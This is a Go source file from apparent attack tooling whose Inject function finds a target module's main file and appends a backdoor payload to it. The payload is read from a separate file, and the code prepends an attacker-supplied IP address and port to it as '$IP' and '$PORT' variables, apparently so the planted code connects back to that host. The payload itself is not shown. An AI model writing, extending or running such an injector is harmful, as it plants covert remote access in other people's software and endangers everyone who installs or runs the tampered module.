package internals

import (
	"fmt"
	"strings"

	"data"
	"utils"
)

func addAddressToString(addr data.Address, str *string) {
	*str = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *str
}

func findModuleName(path string) string {
	var pathSplitted []string = strings.Split(path, "/")
	return pathSplitted[len(pathSplitted) - 1]
}

func Inject(addr data.Address, backdoorPath string, path string) error {
	var moduleName string = findModuleName(path)

	mainFile, err := findMainFileDirectory(path, moduleName)
	if err != nil {
		return err
	}

	mainFilePath := path + "/" + mainFile
	return injectBackDoor(addr, mainFilePath, backdoorPath)
}

func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
	backdoor, err := utils.ReadFile(backdoorPath)
	if err != nil {
		return err
	}

	addAddressToString(addr, &backdoor)
	return utils.AppendToFile(backdoor, filePath)
}